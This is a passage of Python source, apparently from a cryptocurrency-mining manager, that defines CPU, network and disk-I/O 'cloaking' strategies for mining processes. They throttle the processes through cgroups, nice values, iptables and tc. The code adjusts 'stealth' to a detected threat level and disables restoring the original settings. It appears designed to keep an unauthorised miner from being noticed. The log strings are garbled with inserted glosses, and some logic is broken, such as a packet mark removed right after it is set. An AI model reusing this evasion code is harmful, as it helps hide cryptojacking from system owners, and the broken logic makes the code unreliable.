            try:
                cpu_affinity = process.cpu_affinity()
                if not cpu_affinity:
                    self.logger.debug(f"[Affinity Check] **[PID]** (Process ID - mã định danh tiến trình)={pid} has no **[CPU]** (bộ xử lý trung tâm) affinity **[set]** (tập hợp)")
                    return True
                    
                total_cpus = psutil.cpu_count(logical=True)
                cpu_usage_ratio = len(cpu_affinity) / total_cpus if total_cpus else 1
                
                # Stealth optimization: prefer single core or optimized groups
                if self.advanced_stealth_enabled and hasattr(self, 'optimized_affinity_groups'):
                    current_cores = self._get_current_target_cores()
                    if set(cpu_affinity) != set(current_cores):
                        # Note: Should update cgroup cpuset instead of process affinity
                        self.logger.info(f"🎯 [Stealth Affinity] Target cores for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {current_cores} (managed via cgroup cpuset)")
                else:
                    # Standard stealth: limit to fewer cores
                    if cpu_usage_ratio > 0.5:  # Using >50% of cores
                        # Standard stealth: should limit to fewer cores via cgroup cpuset
                        limited_cores = cpu_affinity[:max(1, len(cpu_affinity) // 2)]
                        self.logger.info(f"🔒 [Stealth Limit] Should reduce **[PID]** (Process ID - mã định danh tiến trình)={pid} to {len(limited_cores)} cores via cgroup cpuset")
                
                self.logger.debug(f"🎯 [Affinity OK] **[PID]** (Process ID - mã định danh tiến trình)={pid} using {len(cpu_affinity)}/{total_cpus} cores: {cpu_affinity}")
                
            except Exception as e:
                self.logger.debug(f"[Affinity Check] (kiểm tra gắn lõi) lỗi cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 6. Thread Count Monitoring
            try:
                if hasattr(process, 'num_threads'):
                    thread_count = process.num_threads()
                    if thread_count > 16:  # High thread count
                        self.logger.warning(f"🧵 [**[thread]** (luồng) Alert] **[PID]** (Process ID - mã định danh tiến trình)={pid} has many threads: {thread_count}")
                    else:
                        self.logger.debug(f"🧵 [**[thread]** (luồng) OK] **[PID]** (Process ID - mã định danh tiến trình)={pid} threads: {thread_count}")
            except:
                pass
            
            self.logger.debug(f"✅ [Verification Complete] **[PID]** (Process ID - mã định danh tiến trình)={pid} health check passed")
            return True
            
        except psutil.NoSuchProcess:
            self.logger.warning(f"💀 [**[process]** (tiến trình) Dead] **[PID]** (Process ID - mã định danh tiến trình)={pid} no longer exists - Removing from tracking")
            if pid in self.process_cgroup:
                del self.process_cgroup[pid]
            return False
        except Exception as e:
            self.logger.error(f"❌ [Verification **[error]** (lỗi)] (lỗi xác minh) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            return False

    def configure_for_process_type(self, process_type: str, strategy_hints: Dict[str, Any] = None) -> None:
        """
        ✅ NEW: Tiền cấu hình chiến lược cho loại tiến trình cụ thể.
        
        :param process_type: Kiểu tiến trình 'CPU' hoặc 'GPU'.
        :param strategy_hints: Gợi ý tối ưu hoá tuỳ chọn.
        """
        strategy_hints = strategy_hints or {}
        
        self.process_type_config = {
            'target_type': process_type,
            'stealth_requirements': strategy_hints.get('stealth_requirements', 'medium'),
            'cloaking_aggressiveness': strategy_hints.get('cloaking_aggressiveness', 'moderate'),
            'resource_limits': strategy_hints.get('resource_limits', {}),
            'optimization_level': 'aggressive' if process_type == 'GPU' else 'balanced'
        }
        
        self.logger.info(f"🎯 [**[CPU]** (bộ xử lý trung tâm) Strategy] Pre-configured for {process_type} **[process]** (tiến trình) type")
        self.logger.debug(f"🔧 [**[CPU]** (bộ xử lý trung tâm) Strategy] **[config]** (cấu hình): {self.process_type_config}")

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng [CPU cloaking] (che giấu CPU) với tối ưu hoá nhận biết [metadata] (siêu dữ liệu) và kiểm định giá trị trả về.
        
        :param process: `MiningProcess` nâng cao với [classification metadata] (siêu dữ liệu phân loại).
        :return: bool - True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            
            # ✅ DIAGNOSTIC: Log logger level và hoạt động
            self.logger.debug(f"[DIAGNOSTIC] CpuCloakStrategy.apply() called for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
            self.logger.debug(f"[DIAGNOSTIC] Logger level: {self.logger.level}")
            self.logger.debug(f"[DIAGNOSTIC] Logger name: {self.logger.name}")
            self.logger.debug(f"[DIAGNOSTIC] Logger handlers: {[h.__class__.__name__ for h in self.logger.handlers]}")
            
            # ✅ EXTRACT METADATA từ enhanced MiningProcess
            process_type = process.get_process_type()
            strategy_hints = process.get_strategy_hints()
            hardware_classification = process.get_hardware_classification()
            
            # ✅ UNIFIED: Detailed strategy logging với unified logger
            self.logger.info(f"🎯 [**[CPU]** (bộ xử lý trung tâm) Strategy] (chiến lược **[CPU]** (bộ xử lý trung tâm)) Xử lý tiến trình {process_type}: {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
            self.logger.info(f"📊 [**[CPU]** (bộ xử lý trung tâm) Strategy] Hardware classification: {hardware_classification}")
            self.logger.info(f"💡 [**[CPU]** (bộ xử lý trung tâm) Strategy] Strategy hints: {strategy_hints}")
            
            # ✅ AUTO-CONFIGURE nếu chưa được pre-configured
            if not self.process_type_config:
                self.logger.info(f"⚙️ [**[CPU]** (bộ xử lý trung tâm) Strategy] Auto-configuring for **[process]** (tiến trình) type: {process_type}")
                self.configure_for_process_type(process_type, strategy_hints)
                self.logger.info(f"✅ [**[CPU]** (bộ xử lý trung tâm) Strategy] (chiến lược **[CPU]** (bộ xử lý trung tâm)) Hoàn tất cấu hình cho {process_type}")
            
            # ✅ TYPE-SPECIFIC OPTIMIZATION LOGIC
            optimization_level = self.process_type_config.get('optimization_level', 'balanced')
            stealth_level = self.process_type_config.get('stealth_requirements', 'medium')
            
            self.logger.info(f"🚀 [**[CPU]** (bộ xử lý trung tâm) Strategy] Applying {optimization_level} optimization, stealth={stealth_level}")
            self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Strategy] (chiến lược **[CPU]** (bộ xử lý trung tâm)) Bắt đầu thao tác che giấu **[CPU]** (bộ xử lý trung tâm) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}")

            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
            if self.allowed_process_name and name != self.allowed_process_name:
                self.logger.debug(
                    f"[CPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên CPU trong config."
                )
                return

            # --- BẰNG LOCK ĐỂ TRÁNH RACE CONDITION ---
            with self.core_lock:
                # EARLY HEALTH CHECK: Check process status BEFORE throttling
                try:
                    process_obj = psutil.Process(pid)
                    status = process_obj.status()
                    
                    if status in ['zombie', 'stopped']:
                        self.logger.warning(f"🧟 [Early Check] **[PID]** (Process ID - mã định danh tiến trình)={pid} status: {status} - Skipping throttling")
                        
                        # Try cleanup but don't proceed with throttling
                        try:
                            if status == 'stopped':
                                process_obj.resume()
                                time.sleep(0.1)
                                
                            if process_obj.status() in ['zombie', 'stopped']:
                                process_obj.terminate()
                                time.sleep(0.2)
                                
                                if process_obj.is_running():
                                    process_obj.kill()
                                    
                        except (psutil.AccessDenied, psutil.NoSuchProcess):
                            pass
                        
                        # Remove from tracking and exit early
                        if pid in self.process_cgroup:
                            del self.process_cgroup[pid]
                            self.logger.info(f"🧹 [Early Cleanup] (dọn dẹp sớm) Đã xoá **[PID]** (Process ID - mã định danh tiến trình) chết {pid}, bỏ qua cloaking")
                        
                        return  # EXIT EARLY - no verification needed
                        
                    elif not process_obj.is_running():
                        self.logger.warning(f"💀 [Early Check] **[PID]** (Process ID - mã định danh tiến trình)={pid} not running - Skipping throttling")
                        return
                        
                except psutil.NoSuchProcess:
                    self.logger.warning(f"💀 [Early Check] **[PID]** (Process ID - mã định danh tiến trình)={pid} does not exist - Skipping throttling")
                    return
                except Exception as e:
                    self.logger.debug(f"[Early Check] Cannot verify **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                    # Continue with throttling attempt
                
                base_cgroup_name = f"mining_process_{pid}"
                
                # Sử dụng privileged_manager nếu có cho cgroup setup
                if self.privileged_manager:
                    # Setup cgroup limits qua privileged operations
                    cpu_limit = str(int(100000 * (self.throttle_percentage / 100)))  # microseconds
                    memory_limit = str(2048 * 1024 * 1024)  # 2GB in bytes
                    
                    cgroup_success = self.privileged_manager.setup_cgroup_limits(
                        pid=pid,
                        cpu_limit=cpu_limit,
                        memory_limit=memory_limit
                    )
                    
                    if cgroup_success:
                        self.logger.info(f"🔐 [**[CPU]** (bộ xử lý trung tâm) Cloaking] Setup cgroup via privileged_manager for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                
                # Determine throttle percentage based on stealth mode
                if self.advanced_stealth_enabled:
                    # Use base throttle percentage with threat level adaptation
                    current_throttle = self.base_throttle_percentage
                    if hasattr(self.cpu_resource_manager, 'current_threat_level'):
                        threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                        threat_adjustment = {
                            "LOW": random.uniform(-10, 10),
                            "MEDIUM": random.uniform(10, 30),
                            "HIGH": random.uniform(30, 45)
                        }
                        current_throttle = max(25, min(95, current_throttle + threat_adjustment.get(threat_level, 0)))
                    
                    # Use optimized CPU cores if available
                    target_cores = self._get_current_target_cores()
                    
                    self.logger.info(f"🛡️ [**[CPU]** (bộ xử lý trung tâm) Cloaking] Advanced mode: {current_throttle:.1f}% throttle, cores: {target_cores}")
                else:
                    # Legacy mode
                    current_throttle = self.throttle_percentage if hasattr(self, 'throttle_percentage') else 70
                    target_cores = self.target_cores if hasattr(self, 'target_cores') else [0]
                
                success = self.cpu_resource_manager.throttle_cpu_usage(
                    pid=pid,
                    throttle_percentage=current_throttle,
                    base_cgroup_name=base_cgroup_name,
                    cores=target_cores
                )

                if success:
                    self.process_cgroup[pid] = {"base": base_cgroup_name}
                    stealth_indicator = "🛡️" if self.advanced_stealth_enabled else "🔧"
                    self.logger.info(
                        f"{stealth_indicator} [CPU Cloaking] Throttled {current_throttle:.1f}% for {name}(PID={pid}), cgroup={base_cgroup_name}, cores={target_cores}."
                    )

                    # Verify settings ONLY for successfully throttled processes
                    try:
                        verification_result = self._verify_cgroup_settings_safe(base_cgroup_name, pid)
                        if not verification_result:
                            self.logger.debug(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} had verification issues but throttling succeeded")
                    except Exception as verify_e:
                        self.logger.debug(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Verification **[error]** (lỗi) for **[PID]** (Process ID - mã định danh tiến trình)={pid}: {verify_e}")
                else:
                    self.logger.error(f"[**[CPU]** (bộ xử lý trung tâm) Cloaking] Không thể throttle {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid}).")

            # ✅ UNIFIED: Success completion logging
            self.logger.info(f"✅ [**[CPU]** (bộ xử lý trung tâm) Strategy] Successfully applied **[CPU]** (bộ xử lý trung tâm) cloaking to {name} (**[PID]** (Process ID - mã định danh tiến trình)={pid})")
            self.logger.info(f"📊 [**[CPU]** (bộ xử lý trung tâm) Strategy] Final state - optimization: {optimization_level}, stealth: {stealth_level}")
            return True  # ✅ SUCCESS: CPU cloaking completed successfully
            
        except Exception as e:
            self.logger.error(f"❌ [**[CPU]** (bộ xử lý trung tâm) Strategy] (chiến lược **[CPU]** (bộ xử lý trung tâm)) áp dụng che giấu **[CPU]** (bộ xử lý trung tâm) cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid} thất bại: {e}")
            self.logger.error(f"🔍 [**[CPU]** (bộ xử lý trung tâm) Strategy] (chiến lược **[CPU]** (bộ xử lý trung tâm)) Chi tiết lỗi: {traceback.format_exc()}")
            return False  # ✅ FAILURE: CPU cloaking failed

    def _verify_cgroup_settings_safe(self, base_cgroup_name: str, pid: int) -> bool:
        """
        Xác minh an toàn KHÔNG dọn dẹp - chỉ xác minh, không dọn dẹp
        """
        try:
            process = psutil.Process(pid)
            
            # 1. Basic Process Health Check (no cleanup)
            try:
                status = process.status()
                if status in ['zombie', 'stopped']:
                    self.logger.debug(f"💀 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} status: {status} - Verification incomplete")
                    return False
                elif not process.is_running():
                    self.logger.debug(f"💀 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} not running - Verification incomplete")
                    return False
                else:
                    self.logger.debug(f"✅ [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} status OK: {status}")
                    
            except Exception as e:
                self.logger.debug(f"[Verify] Cannot check status **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                return False
            
            # 2. CPU Usage Monitoring
            try:
                cpu_percent = process.cpu_percent(interval=0.1)
                
                if cpu_percent > 800:  # >8 cores
                    self.logger.warning(f"🚨 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} extreme **[CPU]** (bộ xử lý trung tâm) usage: {cpu_percent:.1f}%")
                elif cpu_percent > 400:  # >4 cores
                    self.logger.info(f"⚠️ [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} high **[CPU]** (bộ xử lý trung tâm) usage: {cpu_percent:.1f}%")
                elif cpu_percent > 200:  # >2 cores  
                    self.logger.debug(f"📊 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} normal mining **[CPU]** (bộ xử lý trung tâm): {cpu_percent:.1f}%")
                else:
                    self.logger.debug(f"📈 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} low **[CPU]** (bộ xử lý trung tâm) usage: {cpu_percent:.1f}%")
                    
            except Exception as e:
                self.logger.debug(f"[Verify] Cannot check **[CPU]** (bộ xử lý trung tâm) usage **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            # 3. Memory & Priority Check
            try:
                memory_percent = process.memory_percent()
                nice_value = process.nice()
                cpu_affinity = process.cpu_affinity()
                affinity_count = len(cpu_affinity) if cpu_affinity else 0
                
                self.logger.debug(f"✅ [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} - **[memory]** (bộ nhớ): {memory_percent:.1f}%, Nice: {nice_value}, Cores: {affinity_count}")
                
            except Exception as e:
                self.logger.debug(f"[Verify] **[resource]** (tài nguyên) check **[error]** (lỗi) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            
            return True
            
        except psutil.NoSuchProcess:
            self.logger.debug(f"💀 [Verify] **[PID]** (Process ID - mã định danh tiến trình)={pid} no longer exists")
            return False
        except Exception as e:
            self.logger.debug(f"❌ [Verify] (xác minh) lỗi cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
            return False

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục CPU - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
        """
        self.logger.info(f"[**[CPU]** (bộ xử lý trung tâm) RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

    def _system_health_monitor(self):
        """
        Giám sát sức khoẻ toàn hệ thống và vòng lặp tối ưu hoá
        """
        while True:
            try:
                self.logger.debug("🔍 [System Health] (sức khoẻ hệ thống) Bắt đầu chu kỳ kiểm tra")
                
                # 1. Cleanup dead processes
                self._cleanup_dead_processes()
                
                # 2. Optimize resource distribution
                self._optimize_resource_distribution()
                
                # 3. Check system-wide stealth indicators
                if self.advanced_stealth_enabled:
                    self._check_stealth_indicators()
                
                # 4. Memory cleanup
                self._system_memory_cleanup()
                
                # Sleep based on stealth mode
                sleep_duration = 45 if self.advanced_stealth_enabled else 90
                self.logger.debug(f"🔍 [System Health] Next check in {sleep_duration}s")
                time.sleep(sleep_duration)
                
            except Exception as e:
                self.logger.error(f"🔍 [System Health] (sức khoẻ hệ thống) Lỗi giám sát: {e}")
                time.sleep(60)

    def _cleanup_dead_processes(self):
        """Dọn dẹp tiến trình 'zombie' và 'stopped' khỏi danh sách theo dõi"""
        try:
            dead_pids = []
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        status = process.status()
                        
                        if status in ['zombie', 'stopped'] or not process.is_running():
                            dead_pids.append(pid)
                            
                    except psutil.NoSuchProcess:
                        dead_pids.append(pid)
                    except Exception as e:
                        self.logger.debug(f"🧹 [Cleanup] (dọn dẹp) Lỗi kiểm tra **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                
                # Remove dead processes
                for pid in dead_pids:
                    if pid in self.process_cgroup:
                        del self.process_cgroup[pid]
                        self.logger.info(f"🧹 [Cleanup] Removed dead **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                        
            if dead_pids:
                self.logger.info(f"🧹 [Cleanup] Cleaned up {len(dead_pids)} dead processes")
            else:
                self.logger.debug("🧹 [Cleanup] No dead processes found")
                
        except Exception as e:
            self.logger.error(f"🧹 [Cleanup] (dọn dẹp) Lỗi khi dọn dẹp tiến trình chết: {e}")

    def _optimize_resource_distribution(self):
        """Tối ưu hoá phân phối tài nguyên trên tất cả tiến trình được quản lý"""
        try:
            if not self.process_cgroup:
                return
                
            active_processes = {}
            total_cpu_usage = 0
            
            # Collect current resource usage
            for pid in list(self.process_cgroup.keys()):
                try:
                    process = psutil.Process(pid)
                    if process.is_running():
                        cpu_percent = process.cpu_percent(interval=0.1)
                        memory_percent = process.memory_percent()
                        
                        active_processes[pid] = {
                            'process': process,
                            'cpu_percent': cpu_percent,
                            'memory_percent': memory_percent
                        }
                        total_cpu_usage += cpu_percent
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            self.logger.debug(f"📊 [**[resource]** (tài nguyên) Opt] (tối ưu tài nguyên) Tổng **[CPU]** (bộ xử lý trung tâm) usage: {total_cpu_usage:.1f}% trên {len(active_processes)} tiến trình")
            
            # Rebalance if total usage is too high
            if total_cpu_usage > 600:  # >6 cores
                self.logger.warning(f"⚖️ [**[resource]** (tài nguyên) Opt] High total **[CPU]** (bộ xử lý trung tâm) usage: {total_cpu_usage:.1f}% - Rebalancing")
                
                # Sort by CPU usage and throttle highest users
                sorted_processes = sorted(active_processes.items(), key=lambda x: x[1]['cpu_percent'], reverse=True)
                
                for pid, info in sorted_processes[:3]:  # Top 3 CPU users
                    try:
                        process = info['process']
                        current_nice = process.nice()
                        
                        if current_nice < 15:  # Can be throttled more
                            process.nice(min(19, current_nice + 5))
                            self.logger.info(f"⚖️ [**[resource]** (tài nguyên) Opt] Increased nice **[value]** (giá trị) for high **[CPU]** (bộ xử lý trung tâm) **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"⚖️ [**[resource]** (tài nguyên) Opt] (tối ưu tài nguyên) Lỗi giới hạn **[CPU]** (bộ xử lý trung tâm) cho **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"⚖️ [**[resource]** (tài nguyên) Opt] Optimization **[error]** (lỗi): {e}")

    def _check_stealth_indicators(self):
        """Kiểm tra các chỉ báo [stealth] (ẩn/che giấu) toàn hệ thống"""
        try:
            if not self.advanced_stealth_enabled:
                return
                
            # Check threat level from resource manager
            if hasattr(self.cpu_resource_manager, 'current_threat_level'):
                threat_level = getattr(self.cpu_resource_manager, 'current_threat_level', 'LOW')
                
                # Adaptive response based on threat level
                if threat_level == "HIGH":
                    self._emergency_stealth_protocol()
                elif threat_level == "MEDIUM":
                    self._enhanced_stealth_protocol()
                else:
                    self.logger.debug(f"🛡️ [Stealth Check] Threat level: {threat_level} - Normal operation")
                    
        except Exception as e:
            self.logger.error(f"🛡️ [Stealth Check] (kiểm tra che giấu) Lỗi: {e}")

    def _emergency_stealth_protocol(self):
        """Các biện pháp [stealth] (ẩn/che giấu) khẩn cấp cho mức đe doạ CAO (HIGH)"""
        try:
            self.logger.warning("🚨 [Emergency Stealth] HIGH threat detected - Activating emergency protocols")
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running():
                            # Maximum stealth settings
                            process.nice(19)  # Lowest priority
                            # Single core enforcement via cgroup cpuset (not process affinity)
                            
                            self.logger.info(f"🚨 [Emergency Stealth] Applied maximum stealth to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"🚨 [Emergency Stealth] (che giấu khẩn cấp) Lỗi với **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"🚨 [Emergency Stealth] **[protocol]** (giao thức) **[error]** (lỗi): {e}")

    def _enhanced_stealth_protocol(self):
        """Các biện pháp [stealth] (ẩn/che giấu) nâng cao cho mức đe doạ TRUNG BÌNH (MEDIUM)"""
        try:
            self.logger.info("⚠️ [Enhanced Stealth] MEDIUM threat detected - Enhancing stealth")
            
            with self.core_lock:
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running():
                            # Enhanced stealth settings
                            current_nice = process.nice()
                            if current_nice < 15:
                                process.nice(15)
                                
                            # Monitor and plan to limit to 2 cores max via cgroup cpuset
                            current_affinity = process.cpu_affinity()
                            if current_affinity and len(current_affinity) > 2:
                                limited_affinity = current_affinity[:2]
                                # Should apply via cgroup cpuset instead of process affinity
                                
                            self.logger.info(f"⚠️ [Enhanced Stealth] Applied enhanced stealth to **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                            
                    except Exception as e:
                        self.logger.debug(f"⚠️ [Enhanced Stealth] (che giấu nâng cao) Lỗi với **[PID]** (Process ID - mã định danh tiến trình)={pid}: {e}")
                        
        except Exception as e:
            self.logger.error(f"⚠️ [Enhanced Stealth] **[protocol]** (giao thức) **[error]** (lỗi): {e}")

    def _system_memory_cleanup(self):
        """Dọn dẹp bộ nhớ hệ thống và tối ưu hoá"""
        try:
            # Force garbage collection
            import gc
            gc.collect()
            
            # Check system memory usage
            memory = psutil.virtual_memory()
            if memory.percent > 80:
                self.logger.warning(f"🧠 [**[memory]** (bộ nhớ) Cleanup] High system **[memory]** (bộ nhớ) usage: {memory.percent:.1f}%")
                
                # Try to free up memory from managed processes
                for pid in list(self.process_cgroup.keys()):
                    try:
                        process = psutil.Process(pid)
                        if process.is_running() and process.memory_percent() > 20:
                            # Could implement memory pressure techniques here
                            self.logger.info(f"🧠 [**[memory]** (bộ nhớ) Cleanup] High **[memory]** (bộ nhớ) **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid}: {process.memory_percent():.1f}%")
                    except:
                        continue
                        
            self.logger.debug(f"🧠 [**[memory]** (bộ nhớ) Cleanup] System **[memory]** (bộ nhớ) usage: {memory.percent:.1f}%")
            
        except Exception as e:
            self.logger.error(f"🧠 [**[memory]** (bộ nhớ) Cleanup] (dọn dẹp bộ nhớ) Lỗi: {e}")


###############################################################################
#            NETWORK STRATEGY: NetworkCloakStrategy                           #
###############################################################################

class NetworkCloakStrategy(CloakStrategy):
    """
    ✅ ENHANCED: [Cloaking] mạng cho [comprehensive multi-strategy environment] (môi trường đa chiến lược toàn diện):
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc).
    
    Nâng cao cho [comprehensive cloaking] (che giấu toàn diện) với [network isolation] (cô lập mạng).
    """
    
    strategy_type = StrategyType.NETWORK
    requires_plugin_system = False  # Network strategies execute directly
    
    # ✅ NEW: Comprehensive cloaking attributes
    is_primary_strategy = False  # Network is SECONDARY strategy
    coordination_priority = 70  # Medium-high priority
    resource_conflicts = []  # No direct conflicts with other strategies
    depends_on_strategies = []  # Independent of other strategies
    supports_concurrent_application = True  # Safe to apply with any other strategy
    estimated_application_time_ms = 200  # iptables + tc commands ~200ms

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: NetworkResourceManager
    ):
        """
        Khởi tạo `NetworkCloakStrategy`.
        
        :param config: Cấu hình [cloaking] mạng (dict).
        :param logger: [Logger] (bộ ghi log).
        :param network_resource_manager: [ResourceManager] liên quan đến mạng.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = cast(Any, network_resource_manager)

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 700)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=500.")
            self.bandwidth_reduction_mbps = 700

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng [network cloaking] (che giấu mạng) với kiểm định giá trị trả về.
        
        :param process: Đối tượng `MiningProcess`.
        :return: bool - True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Dùng pid để tạo mark

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                return False  # ✅ FAILURE: Cannot mark packets

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface, mark, self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return False  # ✅ FAILURE: Cannot limit bandwidth

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho **[PID]** (Process ID - mã định danh tiến trình)={pid}, iface={self.network_interface}.")

            # Rollback mark_packets
            self.network_resource_manager.unmark_packets(pid, mark)
            return True  # ✅ SUCCESS: Network cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Net Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Net Cloaking: Không đủ quyền cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='NetworkCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Network',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Network cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Network - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
        """
        self.logger.info(f"[**[network]** (mạng) RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy(CloakStrategy):
    """
    [Cloaking] Disk I/O (đồng bộ) qua `ionice` hoặc `cgroup I/O` (tuỳ triển khai).
    
    Thiết kế lại theo bản thiết kế (blueprint) với thực thi trực tiếp.
    """
    
    strategy_type = StrategyType.DISK_IO
    requires_plugin_system = False  # Disk I/O strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: DiskIOResourceManager
    ):
        """
        Khởi tạo `DiskIoCloakStrategy`.
        
        :param config: Cấu hình [cloaking] Disk IO (dict).
        :param logger: [Logger] (bộ ghi log).
        :param disk_io_resource_manager: [ResourceManager] liên quan đến Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = cast(Any, disk_io_resource_manager)

        self.io_weight = config.get('io_weight', 3)
        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
            self.io_weight = 3

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng [Disk I/O cloaking] (che giấu Disk I/O) với kiểm định giá trị trả về.
        
        :param process: Đối tượng `MiningProcess`.
        :return: bool - True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] **[PID]** (Process ID - mã định danh tiến trình)={pid}, io_weight={self.io_weight}.")
                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể **[set]** (tập hợp) io_weight cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                return False  # ✅ FAILURE: Cannot set I/O weight
